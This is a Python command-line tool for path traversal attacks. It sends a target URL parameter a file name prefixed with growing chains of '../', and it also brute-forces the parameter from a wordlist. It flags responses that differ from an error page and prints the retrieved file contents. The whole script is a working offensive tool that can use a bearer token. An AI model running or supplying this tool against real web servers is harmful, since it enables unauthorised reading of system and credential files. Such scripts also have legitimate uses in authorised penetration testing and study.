import requests
import argparse
from termcolor import colored

def deafultconfig():
    file = args.wordlist
    with open(file, 'r') as wordlist:
        for word in wordlist:
            print(word)
            print(url,args.param, word, headers)
            req = requests.get(url=url, params={args.param:word},headers=headers)
            print(req.text)

def filefinder():
    escape= ''
    payload = filename
    for i in range(20):
        payload = escape + filename
        params = {
            args.param:payload
        }
        req = requests.get(url=url, params=params,headers=headers)
        if req.text != errpage.text:
            print(colored("[+] File Found:", "green"))
            print(f"    Value: {colored(req.text, 'cyan')}")

            print(colored("[+] Payload Used:", "green"))
            print(f"    Payload: {colored(payload, 'yellow')}")
        escape=escape + "../"


parser = argparse.ArgumentParser(description="Send a request with filename parameter")
parser.add_argument("-u", "--url", required=True, help="Target URL")
parser.add_argument("-f", "--file", required=False, help="Filename to send as parameter")
parser.add_argument("-w", "--wordlist", required=False, help="Wordlist to Brutedorce")
parser.add_argument("-t", "--token", required=False, help="Authentication token")
parser.add_argument("-p","--param", required=True,help="Parameter for the http request")
parser.add_argument("-m","--mode",required=False, help="Enter mode to perform operation")
args = parser.parse_args()

url = args.url
filename=args.file

if (args.token):
    headers = {
        "Authorization": f"Bearer {args.token}"
    }
else:
    headers = None
errpage = requests.get(url=url,params={args.param:"errorfiledoesnotexits"},headers=headers)

if args.mode == "defaultconfig":
    if (args.wordlist):
        deafultconfig()
    else:
        print("Enter Wordlist")
if args.mode == "filefinder":
    if(args.file):
        filefinder()
    else:
        print("Enter file name (-f)")
else:
    req = requests.get(url=url, params={args.param:args.file}, headers=headers)
    if req.text != errpage.text:
        print(req.text)
    else:
        print("File not found")
